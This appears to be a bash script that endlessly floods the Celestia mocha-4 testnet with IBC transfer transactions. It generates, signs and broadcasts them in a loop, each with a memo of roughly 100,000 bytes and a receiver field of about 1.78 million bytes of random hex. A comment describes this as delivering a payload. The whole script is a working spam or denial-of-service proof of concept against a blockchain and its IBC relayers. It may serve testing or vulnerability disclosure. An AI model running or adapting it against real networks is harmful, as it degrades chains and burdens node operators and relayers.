set -ue


# Outer loop grabs sequence number
while true

do
# Note: each hex is two bytes, 10,000+10,000=40,000.  Gas is 10 per byte, so 400,000 + default tx gas for the ibc send
APPNAME="celestia-appd"
CHANNEL=channel-0
ADDRESS=celestia1695pfdl4uxfy2yjr4kkrxvk4s4h964kn5hxn3k
SEQUENCE=$(curl http://127.0.0.1:5003/cosmos/auth/v1beta1/accounts/$ADDRESS | jq --raw-output ' .account.sequence ')
IBCMEMO=50000
RECIEVEADDR=890000
GAS=18914044
CHAINID=mocha-4
IBCTIMEOUTS="--packet-timeout-timestamp 0 --packet-timeout-height 0-100000"
FEES=1891405
UDENOM=utia
ACCOUNT=72556


# Inner loop delivers payload until sequence number mismatch then starts again
while true

do

echo "sequence number is $SEQUENCE"

# Make a new transaction body with a random string
$APPNAME tx ibc-transfer transfer transfer $CHANNEL $ADDRESS 1$UDENOM  --keyring-backend test --memo $(openssl rand -hex $IBCMEMO) --chain-id $CHAINID --yes $IBCTIMEOUTS --generate-only --fees $FEES$UDENOM --gas $GAS --from $ADDRESS &> bareibctx.json
echo "transaction body generated with $((IBCMEMO*2)) byte ibc memo field"

# Step 1: Generate the random hex string and save it to a temporary file
openssl rand -hex $RECIEVEADDR > tmp.txt
echo "random string generated"

# Step 2: Use jq with --arg to set the receiver field
jq --rawfile random_str tmp.txt '.body.messages[0].receiver = $random_str' bareibctx.json > autobanana.json
echo "$(($RECIEVEADDR*2)) byte random string inserted"

# Step 3: remove the temporary file afterwards
rm tmp.txt
echo "temporary file removed"

# Step 4: Sign the transaction
$APPNAME tx sign autobanana.json --from $ADDRESS --yes --sequence $SEQUENCE --chain-id $CHAINID --keyring-backend test --offline --account-number $ACCOUNT &> ban.json
echo "transaction signed"


# Step 5: Broadcast the transaction
$APPNAME tx broadcast ban.json > banana.log
cat banana.log
echo "transaction broadcasted"

# Step 6: Check for a sequence number mismatch
	if [ $(grep -c "mismatch" banana.log) -eq 1 ]
	then
		echo "sequence number mismatch"
		break
	fi

# iterate sequence number
SEQUENCE=$(($SEQUENCE+1))

done

done

echo "if you're running it right the script just restarted"


